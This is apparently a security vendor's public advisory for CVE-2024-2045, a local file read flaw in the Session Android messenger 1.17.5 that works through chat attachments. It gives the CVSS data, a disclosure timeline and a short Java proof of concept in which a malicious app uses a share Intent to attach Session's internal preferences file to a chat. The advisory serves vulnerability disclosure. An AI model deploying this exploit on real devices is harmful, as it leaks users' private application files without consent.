[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# Session 1.17.5 - LFR via chat attachment

## Summary

|  |  |
| --- | --- |
| **Name** | Session 1.17.5 - LFR via chat attachment |
| **Code name** | [Newman](https://en.wikipedia.org/wiki/John_Newman_%28singer%29) |
| **Product** | Session |
| **Affected versions** | Version 1.17.5 |
|
| **State** | Public |
| **Release date** | 2024-02-29 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Business information leak |
| **Rule** | [038. Business information leak](https://docs.fluidattacks.com/criteria/vulnerabilities/038) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N |
| **CVSSv3.1 Base Score** | 4.4 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2024-2045](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2045) |

## Description

Session version 1.17.5 allows obtaining internal application files and public
files from the user's device without the user's consent. This is possible
because the application is vulnerable to Local File Read via chat attachments.

## Vulnerability

An arbitrary local file reading (LFR) vulnerability has been identified in Session.
The exploit allows an attacker to obtain internal application files or files from
public paths accessed by the application such as images, downloads, etc.

## Exploit

```
[...]

public class MainActivity extends AppCompatActivity {

    [...]

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        [...]

        // Hacking Here
        StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX);
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setClassName("network.loki.messenger","org.thoughtcrime.securesms.ShareActivity");
        intent.putExtra(Intent.EXTRA_STREAM, Uri.parse("file:///data/user/0/network.loki.messenger/shared_prefs/network.loki.messenger_preferences.xml"));
        startActivity(intent);
    }

    [...]
}

```
## Evidence of exploitation

In the evidence we can see how a malicious application installed on the victim's
device can force the user to leak internal files from the application and/or device
to a certain contact.

We studied ways to force the automatic sending to any person using Session, but we
did not find a way (however we do not rule out this possibility).

In short, with a bit of social engineering, a malicious contact could persuade his
victim to obtain his internal files without authorization.

## Our security policy

We have reserved the ID CVE-2024-2045 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: Session 1.17.5
* Operating System: Android

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/oxen-io/session-android/>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-02-21

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-02-21

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-02-29

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)

